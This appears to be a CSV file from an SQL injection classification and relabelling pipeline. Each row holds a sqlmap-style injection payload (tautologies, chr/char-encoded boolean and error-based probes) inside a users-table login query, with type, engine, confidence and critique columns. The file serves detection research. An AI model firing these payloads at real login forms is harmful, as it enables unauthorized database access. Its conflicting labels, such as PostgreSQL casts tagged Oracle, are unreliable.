id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
38356,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-1190\' and \'yxry\' like \'yxry"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-1190\' and \'yxry\' like \'yxry"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38357,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and ( 2576 = 2576"" or username = ""1\'|| ( select \'rjun\' where 8868 = 8868",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and ( 2576 = 2576"" or username = ""1\'|| ( select \'rjun\' where 8868 = 8868",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38358,"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and ( ( ( \'mfmk\' = \'mfmk"" or username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and ( ( ( \'mfmk\' = \'mfmk"" or username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38359,"select * from users WHERE username = ""-6353%\' ) ) and ( ( \'%\' = \'"" or username = ""-7720 ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-6353%\' ) ) and ( ( \'%\' = \'"" or username = ""-7720 ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38360,"select * from users WHERE username = ""1 and username = ""-5863"" or username = ""-1854\' ) as fmmq where 7326 = 7326",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""1 and username = ""-5863"" or username = ""-1854\' ) as fmmq where 7326 = 7326",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38361,"SELECT * FROM users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' ) AND username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"SELECT * FROM users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' ) AND username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
38362,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" and username = ""-3424\' ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" and username = ""-3424\' ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38363,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-2374 ) and ( 2576 = 2576"" and username = ""-4248 where 3288 = 3288",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-2374 ) and ( 2576 = 2576"" and username = ""-4248 where 3288 = 3288",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38364,"select * from users WHERE username = ""-1641\' ) ) or username = ""-9553 ) ) or ( ( 5299 = 5299"" and username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"-1641\' ) ) or username = ""-9553 ) ) or ( ( 5299 = 5299"" and username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'",True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
38365,"select * from users WHERE username = ""-6353%\' ) ) or username = ""-3100\' ) or# 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'etuj\' like \'etuj""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-6353%\' ) ) or username = ""-3100\' ) or# 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'etuj\' like \'etuj",True,1,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
38366,"select * from users where username = ""-7874 ) ) )",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users where username = ""-7874 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38367,"select * from users WHERE username = ""1"" and username = ""1 ) or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""1"" and username = ""1 ) or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38368,"select * from users WHERE username = ""-3100\' ) and username = ""-8021\' ) ) and ( ( ( \'btjx\' = \'btjx""",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"-3100\' ) and username = ""-8021\' ) ) and ( ( ( \'btjx\' = \'btjx",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
38369,"select * from users WHERE username = ""1\' ) ) as wkys where 2478 = 2478 and username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) as wkys where 2478 = 2478 and username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38370,"select * from users WHERE username = ""1 and username = ""-5863"" and username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1 and username = ""-5863"" and username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38371,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-1190\' and \'yxry\' like \'yxry""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,-1190\' and \'yxry\' like \'yxry,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
38372,"select * from users WHERE username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1"" and ( ( \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
38373,"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-7430\' ) as xfah where 1596 = 1596",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-7430\' ) as xfah where 1596 = 1596",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38374,"select * from users WHERE username = ""1 and username = ""1\' ) and username = ""1"" or username = ""-8860 )",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""1 and username = ""1\' ) and username = ""1"" or username = ""-8860 )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38375,"select * from users WHERE username = ""1\' ) or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1\' ) or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
38376,"select * from users WHERE username = ""-9564 or username = ""1\' ) ) ) and ( ( ( \'pneh\' like \'pneh""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-9564 or username = ""1\' ) ) ) and ( ( ( \'pneh\' like \'pneh",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
38377,"select * from users WHERE username = ""-8069\' ) ) and username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee""",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"-8069\' ) ) and username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
38378,"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-7430\' ) as xfah where 1596 = 1596 and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38379,"select * from users WHERE username = ""-1254"" and username = ""1\' ) ) ) and username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1\' ) ) ) and username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
38380,"select * from users WHERE username = ""1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9548 = 9548"" and username = ""1\' ) ) ) or username = ""-1254""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9548 = 9548,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38381,"select * from users WHERE username = ""-3978 and username = ""-9295 ) ) ) and username = ""-7430\' ) as xfah where 1596 = 1596",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""-3978 and username = ""-9295 ) ) ) and username = ""-7430\' ) as xfah where 1596 = 1596",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38382,"select * from users WHERE username = ""1\' ) ) ) and username = ""1\'|| ( select \'rjun\' where 8868 = 8868 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1\' ) ) ) and username = ""1\'|| ( select \'rjun\' where 8868 = 8868 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
38383,"select * from users WHERE username = ""1\' ) ) and ( ( \'mmow\' = \'mmow"" or username = ""-7430\' ) as xfah where 1596 = 1596",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) and ( ( \'mmow\' = \'mmow"" or username = ""-7430\' ) as xfah where 1596 = 1596",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
